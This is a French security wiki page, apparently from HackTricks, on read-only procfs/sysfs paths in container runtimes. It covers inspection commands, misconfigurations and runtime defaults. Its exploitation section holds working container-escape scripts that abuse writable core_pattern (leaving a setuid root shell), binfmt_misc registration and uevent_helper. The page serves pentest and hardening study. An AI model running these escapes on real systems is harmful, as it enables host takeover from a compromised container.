# Chemins système en lecture seule

{{#include ../../../../banners/hacktricks-training.md}}

Les chemins système en lecture seule constituent une protection distincte des chemins masqués. Au lieu de masquer complètement un chemin, le runtime l'expose, mais le monte en lecture seule. Cela est courant pour certains emplacements de procfs et sysfs, où l'accès en lecture peut être acceptable ou nécessaire au fonctionnement, tandis que les écritures seraient trop dangereuses.

L'objectif est simple : de nombreuses interfaces du kernel deviennent bien plus dangereuses lorsqu'elles sont accessibles en écriture. Un montage en lecture seule ne supprime pas toute la valeur de reconnaissance, mais il empêche un workload compromis de modifier les fichiers sous-jacents, orientés vers le kernel, via ce chemin.

## Fonctionnement

Les runtimes marquent fréquemment certaines parties de la vue proc/sys comme étant en lecture seule. Selon le runtime et l'hôte, cela peut inclure des chemins tels que :

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

La liste réelle varie, mais le modèle reste le même : autoriser la visibilité lorsque cela est nécessaire et refuser les modifications par défaut.<sup>[[1]](#references)</sup>

## Lab

Inspectez la liste des chemins en lecture seule déclarée par Docker :
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspectez la vue proc/sys montée depuis l’intérieur du container :
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impact sur la sécurité

Les chemins système en lecture seule réduisent une grande catégorie d’abus susceptibles d’affecter l’hôte. Même lorsqu’un attaquant peut inspecter procfs ou sysfs, l’impossibilité d’y écrire supprime de nombreux chemins de modification directs impliquant les paramètres ajustables du kernel, les gestionnaires de crash, les helpers de chargement de modules ou d’autres interfaces de contrôle. L’exposition n’est pas éliminée, mais le passage de la divulgation d’informations à l’influence sur l’hôte devient plus difficile.

## Erreurs de configuration

Les principales erreurs consistent à démasquer ou à remonter des chemins sensibles en lecture-écriture, à exposer directement le contenu de proc/sys de l’hôte avec des bind mounts inscriptibles, ou à utiliser des modes privilégiés qui contournent effectivement les paramètres d’exécution plus sûrs. Dans Kubernetes, `procMount: Unmasked` et les workloads privilégiés vont souvent de pair avec une protection plus faible de proc.<sup>[[2]](#references)</sup> Une autre erreur opérationnelle courante consiste à supposer que, puisque le runtime monte généralement ces chemins en lecture seule, tous les workloads héritent encore de cette configuration par défaut.

## Exploitation

Si la protection est faible, commencez par rechercher les entrées proc/sys inscriptibles :
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Lorsque des entrées inscriptibles sont présentes, les pistes de suivi à forte valeur incluent :
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Ce que ces commandes peuvent révéler :

- Des entrées accessibles en écriture sous `/proc/sys` signifient souvent que le container peut modifier le comportement du kernel de l’hôte, plutôt que de se limiter à l’inspecter.
- `core_pattern` est particulièrement important, car une valeur accessible en écriture et exposée par l’hôte peut être transformée en voie d’exécution de code sur l’hôte en faisant crasher un processus après avoir configuré un gestionnaire de pipe.
- `modprobe` révèle l’helper utilisé par le kernel pour les flux liés au chargement de modules ; c’est une cible classique à haute valeur lorsqu’il est accessible en écriture.
- `binfmt_misc` indique si l’enregistrement d’interpréteurs personnalisés est possible. Si l’enregistrement est accessible en écriture, cela peut devenir une primitive d’exécution, et pas seulement une information leak.
- `panic_on_oom` contrôle une décision du kernel à l’échelle de l’hôte et peut donc transformer l’épuisement des ressources en déni de service de l’hôte.
- `uevent_helper` est l’un des exemples les plus évidents où un chemin d’helper sysfs accessible en écriture permet une exécution dans le contexte de l’hôte.

Les résultats intéressants incluent les knobs proc ou les entrées sysfs exposés par l’hôte et accessibles en écriture, alors qu’ils devraient normalement être en lecture seule. À ce stade, le workload est passé d’une vue limitée du container à une influence significative sur le kernel.

### Exemple complet : évasion du host via `core_pattern`

Si `/proc/sys/kernel/core_pattern` est accessible en écriture depuis l’intérieur du container et pointe vers la vue du kernel de l’hôte, il peut être exploité pour exécuter un payload après un crash :
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Si le chemin atteint réellement le kernel de l’hôte, le payload s’exécute sur l’hôte et laisse derrière lui un setuid shell.

### Exemple complet : enregistrement `binfmt_misc`

Si `/proc/sys/fs/binfmt_misc/register` est accessible en écriture, l’enregistrement d’un interpréteur personnalisé peut permettre l’exécution de code lorsque le fichier correspondant est exécuté :
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Sur un `binfmt_misc` inscriptible et exposé à l'hôte, le résultat est l'exécution de code dans le chemin de l'interpréteur déclenché par le kernel.

### Exemple complet : `uevent_helper`

Si `/sys/kernel/uevent_helper` est inscriptible, le kernel peut invoquer un helper situé sur l'hôte lorsqu'un événement correspondant est déclenché :
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
La raison pour laquelle cela est si dangereux est que le chemin de l’helper est résolu du point de vue du système de fichiers de l’hôte, plutôt que depuis un contexte sûr limité au container.

## Checks

Ces checks déterminent si l’exposition de procfs/sysfs est en lecture seule là où cela est attendu et si la workload peut toujours modifier des interfaces sensibles du kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Ce qui est intéressant ici :

- Une workload durcie normale devrait exposer très peu d’entrées proc/sys accessibles en écriture.
- Les chemins `/proc/sys` accessibles en écriture sont souvent plus importants qu’un simple accès en lecture.
- Si le runtime indique qu’un chemin est en lecture seule alors qu’il est accessible en écriture en pratique, examinez attentivement la propagation des mounts, les bind mounts et les paramètres de privilèges.

## Valeurs par défaut du runtime

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut | Docker définit une liste de chemins en lecture seule par défaut pour les entrées proc sensibles | exposition des mounts proc/sys de l’hôte, `--privileged` |
| Podman | Activé par défaut | Podman applique des chemins en lecture seule par défaut, sauf assouplissement explicite | `--security-opt unmask=ALL`, mounts larges de l’hôte, `--privileged` |
| Kubernetes | Hérite des valeurs par défaut du runtime | Utilise le modèle de chemins en lecture seule du runtime sous-jacent, sauf affaiblissement par les paramètres du Pod ou les mounts de l’hôte | `procMount: Unmasked`, workloads privilégiées, mounts proc/sys de l’hôte accessibles en écriture |
| containerd / CRI-O sous Kubernetes | Valeur par défaut du runtime | S’appuie généralement sur les valeurs par défaut de l’OCI/runtime | identique à la ligne Kubernetes ; les modifications directes de la configuration du runtime peuvent affaiblir ce comportement |

Le point essentiel est que les chemins système en lecture seule sont généralement présents par défaut dans le runtime, mais qu’ils peuvent facilement être contournés par des modes privilégiés ou des bind mounts de l’hôte.

## Références

- [1] [Spécification OCI du runtime : configuration des Linux containers (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
- [2] [Référence de l’API Kubernetes : Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)

{{#include ../../../../banners/hacktricks-training.md}}
